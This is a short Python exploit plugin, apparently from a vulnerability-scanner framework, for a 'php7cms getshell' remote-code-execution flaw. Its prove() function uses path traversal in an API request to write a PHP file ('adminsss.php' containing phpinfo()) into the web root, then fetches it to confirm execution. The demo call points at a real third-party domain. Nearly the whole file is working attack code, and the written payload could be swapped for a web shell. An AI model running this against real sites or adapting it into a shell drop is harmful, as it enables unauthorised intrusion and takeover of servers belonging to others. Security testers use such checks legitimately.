#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'


'''
https://paper.tuisec.win/detail/2139f76293bdb43
'''

def info(data=None):
    info = {
        "name": "php7cms getshell",
        "info": "php7cms getshell",
        "level": "high",
        "type": "rce",
    }
    return info


def prove(data):
    data = init(data, 'php7cms')
    if data['base_url']:
        for path in ["","php7cms/"]:
            postData = {
                'data': '<?php phpinfo()?>'
            }
            url1 = data['base_url'] + path + 'index.php?s=api&c=api&m=save_form_data&name=/../../../adminsss.php"'
            res = curl('post', url1, data=postData)
            if res !=None :
                url2 = data['base_url'] + path + 'adminsss.php'
                res = curl('get', url2)
                if res !=None and  "php.ini" in res.text:
                    data['flag'] = 1
                    data['data'].append({"url": url2})
                    data['res'].append({"info": url1, "key": "php7cms getshell"})
                    break
    return data

if __name__=='__main__':
    from script import init, curl
    print(prove({'url':'http://www.baidu.com','flag':-1,'data':[],'res':[]}))